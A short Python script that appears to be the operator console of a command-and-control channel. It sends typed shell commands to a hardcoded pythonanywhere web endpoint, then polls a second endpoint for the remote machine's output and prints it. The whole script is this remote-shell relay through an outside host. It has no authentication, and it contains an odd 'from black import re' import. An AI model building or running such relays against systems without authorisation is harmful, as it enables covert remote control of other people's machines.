from black import re
import requests

command_link = "https://thefury.pythonanywhere.com/commandinput?input="
response_avalable_link = "https://thefury.pythonanywhere.com/responseavalable"
response_link = "https://thefury.pythonanywhere.com/response"

while True:
    command = input("$<-C0MMAND->>> ")
    requests.get(command_link+command)
    print("<COMMAND-SEND>")
    print("<WATING-FOR-REPLY>")
    while True:
        reply = requests.get(response_avalable_link)
        available = reply.text
        if "True" in available:
            print("<REPLY-AVALABLE>")
            reply = requests.get(response_link)
            reply = reply.text
            print(reply)
            break
            
        
